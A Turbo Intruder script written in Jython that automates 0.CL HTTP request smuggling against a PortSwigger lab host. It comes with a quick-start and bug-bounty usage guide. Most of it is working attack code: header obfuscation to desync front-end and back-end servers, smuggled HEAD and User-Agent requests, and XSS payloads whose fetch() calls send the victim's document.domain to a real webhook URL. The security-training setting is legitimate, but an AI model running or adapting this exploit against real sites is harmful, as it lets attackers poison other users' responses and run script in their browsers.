# Universal 0.CL Request Smuggling Script for Turbo Intruder
# Based on research by James Kettle: https://portswigger.net/research/http1-must-die
# Implements BOTH HEAD redirect and User-Agent XSS techniques
#
# IMPORTANT: Turbo Intruder uses Jython (Python 2.7)
# This version is fully compatible with Jython - NO f-strings

import random

# ============================================================================
# CONFIGURATION - Customize these for your target
# ============================================================================

CONFIG = {
    # Target configuration
    'target_host': '0a71008504f6a9958232ce1a00f700f7.web-security-academy.net',  # NO trailing slash!
    'target_port': 443,
    'use_https': True,

    # Webhook for XSS callback (Burp Collaborator, webhook.site, interact.sh)
    'webhook_url': 'https://webhook.site/4a1f15ba-c06a-4162-8bf8-4d3e7d9ac877',

    # Attack method selection
    'attack_method': 'both',  # Options: 'head', 'user-agent', 'both'

    # Attack vectors
    'gadget_path': '/resources/labheader/js/labHeader.js',  # Early-response gadget
    'gadget_method': 'GET',

    # HEAD technique configuration (James Kettle's preferred method)
    'head_static_resources': [
        '/resources/js/labheader.js',
        '/resources/css/labsBlog.css',
        '/post/comment/confirmation?postId=6',
        '/static/app.js',
        '/static/main.css',
        '/js/main.js',
        '/css/app.css',
    ],

    # User-Agent technique configuration (fallback)
    'smuggled_method': 'GET',
    'smuggled_path': '/',

    # Detection configuration
    'detection_path': '/404',

    # Engine configuration
    'concurrent_connections': 10,
    'requests_per_connection': 1,
    'timeout': 15,
    'max_retries': 0,
    'attack_iterations': 100,  # -1 for infinite

    # Advanced options
    'content_length_obfuscation': 'space',  # space | tab | newline | multiple
    'stage2_method': 'OPTIONS',
    'add_cache_buster': True,
}

# ============================================================================
# MAIN ATTACK LOGIC
# ============================================================================

def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=CONFIG['concurrent_connections'],
        requestsPerConnection=CONFIG['requests_per_connection'],
        engine=Engine.BURP,
        maxRetriesPerRequest=CONFIG['max_retries'],
        timeout=CONFIG['timeout']
    )

    # Validation
    if 'YOUR-WEBHOOK' in CONFIG['webhook_url']:
        raise Exception('Please configure your webhook URL in CONFIG!')
    
    if CONFIG['target_host'].endswith('/'):
        raise Exception('Remove trailing slash from target_host!')

    host = CONFIG['target_host']

    # Build headers and request stages
    cl_header = build_cl_header(CONFIG['content_length_obfuscation'])
    stage1 = build_stage1(host, cl_header)
    stage2_chopped = build_stage2_chopped()
    stage2_revealed = build_stage2_revealed(host)
    victim = build_victim_request(host)

    # Validation
    if '%s' not in stage1:
        raise Exception('Stage1 must contain %s for CL value substitution')
    
    if not stage1.endswith('\r\n\r\n'):
        raise Exception('Stage1 must end with blank line')

    # Status output
    print('[*] ========================================')
    print('[*] 0.CL Request Smuggling Attack Starting')
    print('[*] ========================================')
    print('[*] Target: {}'.format(host))
    print('[*] Webhook: {}'.format(CONFIG['webhook_url']))
    print('[*] Attack Method: {}'.format(CONFIG['attack_method'].upper()))
    print('[*] Gadget Path: {}'.format(CONFIG['gadget_path']))
    print('[*]')
    
    if CONFIG['attack_method'] in ['head', 'both']:
        print('[*] HEAD Technique: Testing {} static resources'.format(
            len(CONFIG['head_static_resources'])
        ))
    if CONFIG['attack_method'] in ['user-agent', 'both']:
        print('[*] User-Agent Technique: Target path {}'.format(
            CONFIG['smuggled_path']
        ))
    
    print('[*]')
    print('[*] WATCH YOUR WEBHOOK FOR CALLBACKS!')
    print('[*] ========================================')
    print('[*]')

    iteration = 0
    resource_index = 0

    # Main attack loop
    while CONFIG['attack_iterations'] == -1 or iteration < CONFIG['attack_iterations']:

        # Choose technique
        if CONFIG['attack_method'] == 'both':
            use_head = (iteration % 2 == 0)
        elif CONFIG['attack_method'] == 'head':
            use_head = True
        else:
            use_head = False

        # Build smuggled request
        if use_head:
            static_resource = CONFIG['head_static_resources'][
                resource_index % len(CONFIG['head_static_resources'])
            ]
            smuggled = build_smuggled_head_request(host, static_resource)
            technique = 'HEAD'
            resource_index += 1
        else:
            smuggled = build_smuggled_useragent_request(host)
            technique = 'User-Agent'

        chopped_length = len(stage2_chopped)

        # Queue attack chain
        engine.queue(stage1, chopped_length, label='stage1', fixContentLength=False)
        engine.queue(
            stage2_chopped + stage2_revealed + smuggled,
            label='stage2-{}'.format(technique)
        )
        engine.queue(victim, label='victim-{}'.format(technique))

        iteration += 1
        
        # Progress reporting and rate limiting
        if iteration % 20 == 0:
            print('[*] Completed {} attack attempts...'.format(iteration))
            # Add a delay request for rate limiting
            engine.queue(build_sleep_request(host), label='sleep')


# ============================================================================
# PAYLOAD BUILDERS
# ============================================================================

def build_xss_payload():
    """XSS payload for User-Agent technique"""
    return '"/><script>fetch("{}?xss="+document.domain)</script><x x="'.format(
        CONFIG['webhook_url']
    )


def build_head_xss_payload():
    """XSS payload for HEAD redirect technique"""
    return '</script><script>fetch("{}?head="+document.domain)</script>'.format(
        CONFIG['webhook_url']
    )


# ============================================================================
# REQUEST BUILDERS
# ============================================================================

def build_cl_header(obfuscation_type):
    """Build Content-Length header with obfuscation"""
    if obfuscation_type == 'space':
        return 'Content-Length : %s'
    elif obfuscation_type == 'tab':
        return 'Content-Length\t: %s'
    elif obfuscation_type == 'newline':
        return 'Content-Length\r\n : %s'
    elif obfuscation_type == 'multiple':
        return 'Content-Length: 0\r\nContent-Length : %s'
    return 'Content-Length : %s'


def build_stage1(host, cl_header):
    """Stage 1: Early response gadget with obfuscated CL"""
    cache_buster = ''
    if CONFIG['add_cache_buster']:
        cache_buster = '?cb={}'.format(random.randint(1000, 9999))

    return (
        '{} {}{} HTTP/1.1\r\n'
        'Host: {}\r\n'
        'Content-Type: application/x-www-form-urlencoded\r\n'
        'Connection: keep-alive\r\n'
        '{}\r\n'
        '\r\n'
    ).format(
        CONFIG['gadget_method'],
        CONFIG['gadget_path'],
        cache_buster,
        host,
        cl_header
    )


def build_smuggled_head_request(host, resource):
    """Smuggled HEAD request (James Kettle's technique)"""
    payload = build_head_xss_payload()
    return (
        'HEAD {}?x={} HTTP/1.1\r\n'
        'Host: {}\r\n'
        'Content-Length: 5\r\n'
        '\r\n'
        'x=1'
    ).format(resource, payload, host)


def build_smuggled_useragent_request(host):
    """Smuggled GET request with XSS in User-Agent"""
    payload = build_xss_payload()
    return (
        '{} {} HTTP/1.1\r\n'
        'Host: {}\r\n'
        'User-Agent: {}\r\n'
        'Content-Type: application/x-www-form-urlencoded\r\n'
        'Content-Length: 5\r\n'
        '\r\n'
        'x=1'
    ).format(
        CONFIG['smuggled_method'],
        CONFIG['smuggled_path'],
        host,
        payload
    )


def build_stage2_chopped():
    """Stage 2 chopped request"""
    return (
        '{} / HTTP/1.1\r\n'
        'Content-Length: 123\r\n'
        'X: Y'
    ).format(CONFIG['stage2_method'])


def build_stage2_revealed(host):
    """Stage 2 revealed request"""
    cache_buster = ''
    if CONFIG['add_cache_buster']:
        cache_buster = '?cb={}'.format(random.randint(1000, 9999))

    return (
        'GET {}{} HTTP/1.1\r\n'
        'Host: {}\r\n'
        'User-Agent: smuggle-detector\r\n'
        'Content-Type: application/x-www-form-urlencoded\r\n'
        'Connection: keep-alive\r\n'
        '\r\n'
    ).format(CONFIG['detection_path'], cache_buster, host)


def build_victim_request(host):
    """Victim request that will be poisoned"""
    return (
        'GET / HTTP/1.1\r\n'
        'Host: {}\r\n'
        'User-Agent: victim-browser\r\n'
        'Connection: keep-alive\r\n'
        '\r\n'
    ).format(host)


def build_sleep_request(host):
    """Simple request for rate limiting delays"""
    return (
        'GET / HTTP/1.1\r\n'
        'Host: {}\r\n'
        '\r\n'
    ).format(host)


# ============================================================================
# RESPONSE HANDLING
# ============================================================================

def handleResponse(req, interesting):
    """Handle and analyze responses"""
    table.add(req)
    
    # Determine technique used
    is_head_technique = 'HEAD' in req.label
    is_useragent_technique = 'User-Agent' in req.label
    
    # Focus on victim responses
    if 'victim' in req.label:
        if not req.response:
            return
        
        response_text = req.response
        response_lower = response_text.lower()
        
        # XSS indicators
        xss_indicators = [
            '<script>',
            'fetch(',
            'document.domain',
            'document.cookie',
            CONFIG['webhook_url'].lower(),
        ]
        
        # Check for XSS indicators
        for indicator in xss_indicators:
            if indicator in response_lower:
                technique = 'HEAD' if is_head_technique else 'User-Agent'
                print('')
                print('[+] ========================================')
                print('[+] POTENTIAL XSS DETECTED!')
                print('[+] ========================================')
                print('[+] Technique: {}'.format(technique))
                print('[+] Indicator: "{}"'.format(indicator))
                print('[+] Status: {}'.format(req.status))
                print('[+] Length: {}'.format(len(response_text)))
                print('[!]')
                print('[!] CHECK YOUR WEBHOOK FOR CALLBACK!')
                print('[!] Webhook: {}'.format(CONFIG['webhook_url']))
                print('[+] ========================================')
                print('')
                req.interesting = True
                break
        
        # HEAD technique: Look for redirects
        if is_head_technique:
            redirect_indicators = [
                'location:',
                '301 moved',
                '302 found',
                '307 temporary',
                '308 permanent',
            ]
            
            for indicator in redirect_indicators:
                if indicator in response_lower:
                    print('')
                    print('[+] ========================================')
                    print('[+] HEAD REDIRECT DETECTED!')
                    print('[+] ========================================')
                    print('[+] Status: {}'.format(req.status))
                    print('[!] Possible Location header with XSS payload')
                    print('[!] CHECK YOUR WEBHOOK FOR CALLBACK!')
                    print('[+] ========================================')
                    print('')
                    req.interesting = True
                    break
            
            # Check for 3xx status codes
            if req.status in [301, 302, 307, 308]:
                print('[+] HEAD REDIRECT! Status: {}'.format(req.status))
                req.interesting = True
        
        # Check for reflected webhook URL (strongest indicator)
        if CONFIG['webhook_url'] in response_text:
            technique = 'HEAD' if is_head_technique else 'User-Agent'
            print('')
            print('[+] ========================================')
            print('[+] SUCCESS! WEBHOOK URL REFLECTED!')
            print('[+] ========================================')
            print('[+] Technique: {}'.format(technique))
            print('[+] Status: {}'.format(req.status))
            print('[+] Length: {}'.format(len(response_text)))
            print('[!]')
            print('[!] MONITOR YOUR WEBHOOK NOW!')
            print('[!] Webhook: {}'.format(CONFIG['webhook_url']))
            print('[+] ========================================')
            print('')
            req.interesting = True
        
        # Check for unusual status codes (access to restricted areas)
        if req.status in [403, 401, 500, 502, 503]:
            technique = 'HEAD' if is_head_technique else 'User-Agent'
            print('[*] Interesting status {} on victim request ({})'.format(
                req.status, technique
            ))
            # Don't mark as interesting automatically - too many false positives
    
    # Log stage1 and stage2 errors for debugging
    elif req.label.startswith('stage'):
        if req.status >= 400 and req.status != 404:
            print('[!] Error in {}: Status {}'.format(req.label, req.status))


# ============================================================================
# USAGE INSTRUCTIONS
# ============================================================================
"""
QUICK START GUIDE FOR TURBO INTRUDER (JYTHON/PYTHON 2.7):
==========================================================

1. CONFIGURE YOUR ATTACK:
   - Set 'target_host' (NO trailing slash!)
   - Set 'webhook_url' to your webhook
   - Set 'gadget_path' to early-response path
   - Choose 'attack_method': 'both', 'head', or 'user-agent'

2. GET A WEBHOOK:
   - Burp Collaborator: Burp menu → Collaborator client → Copy
   - Webhook.site: Visit https://webhook.site and copy URL
   - Interact.sh: curl -X POST https://interact.sh/register

3. FIND EARLY RESPONSE GADGET:
   - Try: /resources/*, /static/*, /css/*, /js/*
   - Test: POST with large Content-Length but no body
   - If immediate response → valid gadget!

4. RUN THE ATTACK:
   - Load script in Turbo Intruder
   - Click "Attack"
   - Watch console output
   - Monitor your webhook dashboard

5. SUCCESS INDICATORS:
   - "[+] SUCCESS! WEBHOOK URL REFLECTED!"
   - "[+] HEAD REDIRECT DETECTED!"
   - "[+] POTENTIAL XSS DETECTED!"
   - Webhook receives callback with domain

ATTACK METHODS:
===============

HEAD (Recommended):
- Smuggles HEAD requests to static resources
- XSS in query param causes redirect with Location header
- More reliable, works on static files
- Example: HEAD /static/app.js?x=<script>...

User-Agent (Fallback):
- Smuggles GET with XSS in User-Agent header
- Requires reflection/logging of User-Agent
- Good for admin panels with request logs
- Example: GET / with User-Agent: <script>...

Both (Default):
- Alternates between HEAD and User-Agent
- Maximum coverage, finds what works
- Recommended for initial testing

TROUBLESHOOTING:
================

No callbacks:
- Try different gadget paths
- Test different static resources
- Verify webhook URL is accessible
- Check if HEAD requests are blocked

Rate limited:
- Reduce 'concurrent_connections'
- Reduce 'attack_iterations'
- Script auto-adds delays every 20 requests

Errors:
- "Remove trailing slash" → Fix target_host
- "Please configure webhook" → Set webhook_url
- Stage errors → Try different gadget_path

PORTSWIGGER LAB SPECIFIC:
==========================

For PortSwigger Web Security Academy labs:
1. Set target_host to lab URL (no https://, no trailing /)
2. Common gadgets: /resources/css/*, /resources/js/*
3. Try 'attack_method': 'both' first
4. Labs usually work within 50-100 iterations

Example:
'target_host': '0abc123.web-security-academy.net'
'gadget_path': '/resources/css/labsBlog.css'

REAL BUG BOUNTY TIPS:
=====================

1. Always start with 'attack_method': 'both'
2. HEAD technique usually more successful
3. Test multiple static resources
4. Document which technique worked
5. Take screenshots of webhook callbacks
6. Report with full reproduction steps

Remember: This is for AUTHORIZED testing only!
"""
